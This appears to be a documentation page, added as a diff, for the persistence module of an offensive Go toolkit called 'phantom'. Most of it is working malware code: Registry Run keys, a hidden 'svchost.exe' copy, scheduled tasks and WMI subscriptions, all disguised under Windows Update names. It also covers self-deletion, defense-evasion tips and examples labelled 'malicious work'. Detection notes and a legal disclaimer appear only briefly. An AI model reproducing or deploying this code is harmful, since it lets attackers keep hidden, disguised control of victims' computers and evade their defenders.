@@ -1,0 +1,595 @@
+---
+title: "Persistence Mechanisms"
+description: "Documentation for the persist module - establishing persistence through registry, startup folder, scheduled tasks, and WMI subscriptions"
+---
+
+## Overview
+
+The `persist` module implements multiple persistence mechanisms to maintain access across reboots. Methods range from simple registry keys to stealthy WMI event subscriptions.
+
+<Warning>
+Persistence mechanisms are highly detectable by antivirus and EDR solutions. Use only when absolutely necessary.
+</Warning>
+
+## Persistence Methods
+
+### PersistMethod Enum
+
+```go persist/persist.go:27-34
+type PersistMethod int
+
+const (
+    Registry        PersistMethod = iota // HKCU Run key
+    StartupFolder                        // Startup folder shortcut
+    ScheduledTask                        // schtasks
+    WMISubscription                      // WMI event subscription
+)
+```
+
+<Tabs>
+  <Tab title="Registry">
+    - **Privilege**: User-level
+    - **Stealth**: Low (easily detected)
+    - **Reliability**: High
+    - **Location**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+  </Tab>
+  <Tab title="Startup Folder">
+    - **Privilege**: User-level
+    - **Stealth**: Very Low (visible in Startup folder)
+    - **Reliability**: High
+    - **Location**: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
+  </Tab>
+  <Tab title="Scheduled Task">
+    - **Privilege**: User-level (admin for highest privilege)
+    - **Stealth**: Medium
+    - **Reliability**: High
+    - **Trigger**: Logon, time-based, or event-based
+  </Tab>
+  <Tab title="WMI Subscription">
+    - **Privilege**: User-level (admin recommended)
+    - **Stealth**: High (rarely checked)
+    - **Reliability**: Medium
+    - **Method**: Event filter + consumer binding
+  </Tab>
+</Tabs>
+
+## Main Installation Function
+
+### Install()
+
+Establishes persistence using the specified method:
+
+```go persist/persist.go:38-56
+func Install(method PersistMethod) error {
+    exePath, err := os.Executable()
+    if err != nil {
+        return err
+    }
+
+    switch method {
+    case Registry:
+        return installRegistry(exePath)
+    case StartupFolder:
+        return installStartupFolder(exePath)
+    case ScheduledTask:
+        return installScheduledTask(exePath)
+    case WMISubscription:
+        return installWMI(exePath)
+    default:
+        return installRegistry(exePath)
+    }
+}
+```
+
+<ParamField path="method" type="PersistMethod">
+  Persistence method to use (Registry is default and most reliable)
+</ParamField>
+
+**Returns:** Error if persistence installation failed
+
+## Method 1: Registry Run Key
+
+### installRegistry()
+
+Adds executable to registry Run key (most common method):
+
+```go persist/persist.go:59-67
+func installRegistry(exePath string) error {
+    key, err := syscalls.RegOpenKey(syscalls.HKEY_CURRENT_USER, 
+        `Software\Microsoft\Windows\CurrentVersion\Run`)
+    if err != nil {
+        return err
+    }
+    defer syscalls.RegCloseKey(key)
+
+    return syscalls.RegSetValue(key, "WindowsUpdate", exePath)
+}
+```
+
+<Accordion title="Registry Persistence Details">
+**Location:**
+```
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+```
+
+**Value name:** `WindowsUpdate` (masquerades as Windows Update)
+
+**Value data:** Full path to executable
+
+**Trigger:** User logon
+
+**Detection:**
+- Autoruns (Sysinternals)
+- Registry monitoring tools
+- Most AV/EDR solutions
+
+**Advantages:**
+- No admin required
+- Survives reboots
+- Highly reliable
+
+**Disadvantages:**
+- Easily detected
+- Can be removed by user
+- Logged by Windows Event Log
+</Accordion>
+
+<Note>
+The value name "WindowsUpdate" is used to masquerade as a legitimate Windows component. Consider randomizing this for better stealth.
+</Note>
+
+## Method 2: Startup Folder
+
+### installStartupFolder()
+
+Copies executable to Windows Startup folder:
+
+```go persist/persist.go:70-89
+func installStartupFolder(exePath string) error {
+    startupPath := filepath.Join(os.Getenv("APPDATA"), 
+        "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    destPath := filepath.Join(startupPath, "svchost.exe")
+
+    // copy current executable
+    input, err := os.ReadFile(exePath)
+    if err != nil {
+        return err
+    }
+
+    err = os.WriteFile(destPath, input, 0644)
+    if err != nil {
+        return err
+    }
+
+    // hide the file
+    hideFile(destPath)
+
+    return nil
+}
+```
+
+### hideFile()
+
+Sets file attributes to hidden and system:
+
+```go persist/persist.go:157-165
+func hideFile(path string) error {
+    pathPtr, err := syscall.UTF16PtrFromString(path)
+    if err != nil {
+        return err
+    }
+
+    attrs := uint32(syscall.FILE_ATTRIBUTE_HIDDEN | syscall.FILE_ATTRIBUTE_SYSTEM)
+    return syscall.SetFileAttributes(pathPtr, attrs)
+}
+```
+
+<Accordion title="Startup Folder Persistence">
+**Location:**
+```
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+```
+
+**Filename:** `svchost.exe` (mimics Windows Service Host)
+
+**Attributes:** Hidden + System
+
+**Detection:**
+- Visible in Task Manager Startup tab
+- Easily found by users
+- File hash scanning
+
+**Advantages:**
+- Simple implementation
+- No registry modification
+- Reliable execution
+
+**Disadvantages:**
+- Very easy to detect
+- Visible in Startup folder
+- Filename must be believable
+</Accordion>
+
+## Method 3: Scheduled Task
+
+### installScheduledTask()
+
+Creates scheduled task that runs at user logon:
+
+```go persist/persist.go:92-111
+func installScheduledTask(exePath string) error {
+    taskName := "WindowsSecurityUpdate"
+
+    // delete existing task if any
+    delCmd := exec.Command("schtasks", "/delete", "/tn", taskName, "/f")
+    delCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    delCmd.Run()
+
+    // create new task - runs at logon
+    createCmd := exec.Command("schtasks", "/create",
+        "/tn", taskName,
+        "/tr", exePath,
+        "/sc", "onlogon",
+        "/rl", "highest",
+        "/f",
+    )
+    createCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+    return createCmd.Run()
+}
+```
+
+<Accordion title="Scheduled Task Parameters">
+**Task name:** `WindowsSecurityUpdate`
+
+**schtasks flags:**
+- `/tn` - Task name
+- `/tr` - Task to run (executable path)
+- `/sc` - Schedule type (`onlogon`)
+- `/rl` - Run level (`highest` - requires admin)
+- `/f` - Force create (overwrites existing)
+
+**Alternative schedules:**
+```bash
+# Run every hour
+/sc hourly /mo 1
+
+# Run at specific time
+/sc daily /st 09:00
+
+# Run at startup
+/sc onstart
+```
+
+**View tasks:**
+```bash
+schtasks /query /tn WindowsSecurityUpdate
+```
+
+**Delete task:**
+```bash
+schtasks /delete /tn WindowsSecurityUpdate /f
+```
+</Accordion>
+
+<Warning>
+Using `/rl highest` requires UAC elevation. For user-level persistence, omit this flag.
+</Warning>
+
+## Method 4: WMI Event Subscription
+
+### installWMI()
+
+Creates WMI event subscription (most stealthy method):
+
+```go persist/persist.go:114-154
+func installWMI(exePath string) error {
+    filterName := "WindowsUpdateFilter"
+    consumerName := "WindowsUpdateConsumer"
+
+    // create event filter (triggers every 60 seconds)
+    filterCmd := fmt.Sprintf(`
+        $filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
+            Name = "%s"
+            EventNameSpace = "root\cimv2"
+            QueryLanguage = "WQL"
+            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+        }
+    `, filterName)
+
+    // create command line event consumer
+    consumerCmd := fmt.Sprintf(`
+        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -NameSpace "root\subscription" -Arguments @{
+            Name = "%s"
+            CommandLineTemplate = "%s"
+        }
+    `, consumerName, exePath)
+
+    // bind filter to consumer
+    bindingCmd := fmt.Sprintf(`
+        $binding = Set-WmiInstance -Class __FilterToConsumerBinding -NameSpace "root\subscription" -Arguments @{
+            Filter = $filter
+            Consumer = $consumer
+        }
+    `)
+
+    fullScript := filterCmd + "\n" + consumerCmd + "\n" + bindingCmd
+
+    cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", fullScript)
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+    return cmd.Run()
+}
+```
+
+<Accordion title="WMI Persistence Components">
+**1. Event Filter (`__EventFilter`)**
+- Defines what events to monitor
+- Uses WQL (WMI Query Language)
+- Example: Performance counter modifications every 60 seconds
+
+**2. Event Consumer (`CommandLineEventConsumer`)**
+- Defines action to take when event occurs
+- Executes command line template
+- Contains path to malicious executable
+
+**3. Filter-to-Consumer Binding (`__FilterToConsumerBinding`)**
+- Links filter to consumer
+- Activates the subscription
+
+**WQL Query:**
+```sql
+SELECT * FROM __InstanceModificationEvent 
+WITHIN 60 
+WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
+```
+- Triggers every 60 seconds when performance data updates
+- Extremely common event (low suspicion)
+
+**View WMI subscriptions:**
+```powershell
+Get-WmiObject -Namespace root\subscription -Class __EventFilter
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
+```
+</Accordion>
+
+<Note>
+WMI persistence is powerful but rarely used by legitimate software, making it a red flag for advanced detection.
+</Note>
+
+## Persistence Removal
+
+### Remove()
+
+Removes all persistence mechanisms:
+
+```go persist/persist.go:168-193
+func Remove() {
+    // registry
+    key, err := syscalls.RegOpenKey(syscalls.HKEY_CURRENT_USER, 
+        `Software\Microsoft\Windows\CurrentVersion\Run`)
+    if err == nil {
+        // would need RegDeleteValue
+        syscalls.RegCloseKey(key)
+    }
+
+    // startup folder
+    startupPath := filepath.Join(os.Getenv("APPDATA"), 
+        "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "svchost.exe")
+    os.Remove(startupPath)
+
+    // scheduled task
+    delCmd := exec.Command("schtasks", "/delete", "/tn", "WindowsSecurityUpdate", "/f")
+    delCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    delCmd.Run()
+
+    // WMI
+    wmiCmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", `
+        Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='WindowsUpdateFilter'" | Remove-WmiObject
+        Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'" | Remove-WmiObject
+        Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like '*WindowsUpdateFilter*'} | Remove-WmiObject
+    `)
+    wmiCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    wmiCmd.Run()
+}
+```
+
+## Self-Destruct
+
+### SelfDelete()
+
+Deletes the executable after execution:
+
+```go persist/persist.go:196-219
+func SelfDelete() error {
+    exePath, err := os.Executable()
+    if err != nil {
+        return err
+    }
+
+    // batch file to delete after delay
+    batContent := fmt.Sprintf(`
+@echo off
+ping 127.0.0.1 -n 3 > nul
+del /f /q "%s"
+del /f /q "%%~f0"
+`, exePath)
+
+    batPath := filepath.Join(os.TempDir(), "cleanup.bat")
+    err = os.WriteFile(batPath, []byte(batContent), 0644)
+    if err != nil {
+        return err
+    }
+
+    cmd := exec.Command("cmd", "/c", batPath)
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    return cmd.Start()
+}
+```
+
+<Accordion title="Self-Delete Mechanism">
+**How it works:**
+1. Create batch file in temp directory
+2. Batch file waits 3 seconds (`ping` delay trick)
+3. Deletes the original executable
+4. Deletes itself (`%%~f0` refers to batch file path)
+
+**Batch file commands:**
+```batch
+@echo off              # Disable command echo
+ping 127.0.0.1 -n 3   # Wait ~3 seconds
+del /f /q "exe.path"  # Delete executable (force, quiet)
+del /f /q "%~f0"      # Delete batch file itself
+```
+
+**Limitations:**
+- File may still be locked if handles are open
+- AV may block deletion
+- Event logs will show process termination
+</Accordion>
+
+## File Operations
+
+### CopyToTemp()
+
+Copies executable to temp directory:
+
+```go persist/persist.go:222-243
+func CopyToTemp() (string, error) {
+    exePath, err := os.Executable()
+    if err != nil {
+        return "", err
+    }
+
+    data, err := os.ReadFile(exePath)
+    if err != nil {
+        return "", err
+    }
+
+    tempDir := os.TempDir()
+    destPath := filepath.Join(tempDir, "svchost.exe")
+
+    err = os.WriteFile(destPath, data, 0755)
+    if err != nil {
+        return "", err
+    }
+
+    hideFile(destPath)
+    return destPath, nil
+}
+```
+
+### RunFromTemp()
+
+Runs a copy from temp directory:
+
+```go persist/persist.go:246-256
+func RunFromTemp() error {
+    tempPath, err := CopyToTemp()
+    if err != nil {
+        return err
+    }
+
+    cmd := exec.Command(tempPath)
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    return cmd.Start()
+}
+```
+
+## Usage Examples
+
+### Basic Persistence
+
+```go
+import "phantom/persist"
+
+func main() {
+    // Install registry persistence (default, most reliable)
+    err := persist.Install(persist.Registry)
+    if err != nil {
+        log.Printf("Registry persistence failed: %v", err)
+    }
+
+    // Try WMI for stealth
+    err = persist.Install(persist.WMISubscription)
+    if err != nil {
+        log.Printf("WMI persistence failed: %v", err)
+    }
+}
+```
+
+### Multiple Methods
+
+```go
+// Install multiple persistence methods for redundancy
+func establishPersistence() {
+    methods := []persist.PersistMethod{
+        persist.Registry,
+        persist.ScheduledTask,
+        persist.StartupFolder,
+    }
+
+    for _, method := range methods {
+        if err := persist.Install(method); err != nil {
+            log.Printf("Failed to install %v: %v", method, err)
+        }
+    }
+}
+```
+
+### Self-Delete After Execution
+
+```go
+import (
+    "phantom/persist"
+    "os"
+)
+
+func main() {
+    // Do malicious work
+    doWork()
+
+    // Clean up persistence
+    persist.Remove()
+
+    // Delete self
+    persist.SelfDelete()
+    
+    os.Exit(0)
+}
+```
+
+## Detection and Mitigation
+
+<Warning>
+**Common detection methods:**
+- Autoruns (Sysinternals) - Shows all autostart locations
+- Process Monitor - Logs registry and file modifications
+- Event logs - Records task creation, WMI subscriptions
+- EDR solutions - Behavioral analysis of persistence
+</Warning>
+
+<Accordion title="Defense Evasion Tips">
+1. **Randomize names** - Don't use predictable names like "WindowsUpdate"
+2. **Legitimate paths** - Place executables in common locations
+3. **Digital signatures** - Sign executables (if possible)
+4. **Timing** - Install persistence during system updates
+5. **Multiple methods** - Use redundancy for persistence
+6. **Fileless** - Consider memory-only persistence
+</Accordion>
+
+## Security Considerations
+
+<Note>
+**Operational Security:**
+- Registry Run keys are logged in Event ID 4688 (process creation)
+- Scheduled tasks generate Event ID 4698 (task created)
+- WMI subscriptions are rarely monitored but visible to WMI queries
+- Startup folder modifications are visible to users
+</Note>
+
+<Warning>
+**Legal Warning:**
+Unauthorized persistence mechanisms on systems you don't own is illegal in most jurisdictions. This module is for security research and authorized testing only.
+</Warning>
